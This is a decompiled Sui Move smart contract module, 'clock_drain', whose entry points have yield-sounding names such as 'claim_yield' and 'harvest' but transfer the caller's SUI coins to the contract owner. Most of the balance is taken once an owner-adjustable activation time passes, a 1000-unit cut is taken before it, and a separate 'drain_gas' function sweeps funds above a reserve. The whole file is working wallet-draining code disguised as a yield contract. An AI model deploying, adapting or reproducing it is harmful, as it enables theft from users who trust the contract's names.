module 0x9ad278018480079f377c66e43d469f3bbae15290c788bb6da25420fa37ba9f72::clock_drain {
    struct Config has key {
        id: 0x2::object::UID,
        owner: address,
        activation_ms: u64,
    }

    public entry fun claim_yield(arg0: &Config, arg1: &0x2::clock::Clock, arg2: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg3: &mut 0x2::tx_context::TxContext) {
        if (0x2::clock::timestamp_ms(arg1) >= arg0.activation_ms) {
            let v0 = 0x2::coin::value<0x2::sui::SUI>(arg2);
            if (v0 > 1) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(arg2, v0 - 1, arg3), arg0.owner);
            };
        };
    }

    public entry fun create_config(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Config{
            id            : 0x2::object::new(arg0),
            owner         : 0x2::tx_context::sender(arg0),
            activation_ms : 99999999999999,
        };
        0x2::transfer::share_object<Config>(v0);
    }

    public entry fun drain_gas(arg0: &Config, arg1: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.activation_ms == 0) {
            let v0 = 0x2::coin::value<0x2::sui::SUI>(arg1);
            let v1 = 50000000;
            if (v0 > v1 + 1) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(arg1, v0 - v1, arg2), arg0.owner);
            };
        };
    }

    public entry fun harvest(arg0: &Config, arg1: &0x2::clock::Clock, arg2: 0x2::coin::Coin<0x2::sui::SUI>, arg3: &mut 0x2::tx_context::TxContext) {
        if (0x2::clock::timestamp_ms(arg1) >= arg0.activation_ms) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg2, arg0.owner);
        } else if (0x2::coin::value<0x2::sui::SUI>(&arg2) > 1000) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(&mut arg2, 1000, arg3), arg0.owner);
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg2, 0x2::tx_context::sender(arg3));
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg2, 0x2::tx_context::sender(arg3));
        };
    }

    public entry fun set_window(arg0: &mut Config, arg1: u64, arg2: &0x2::tx_context::TxContext) {
        assert!(arg0.owner == 0x2::tx_context::sender(arg2), 0);
        arg0.activation_ms = arg1;
    }

    // decompiled from Move bytecode v7
}

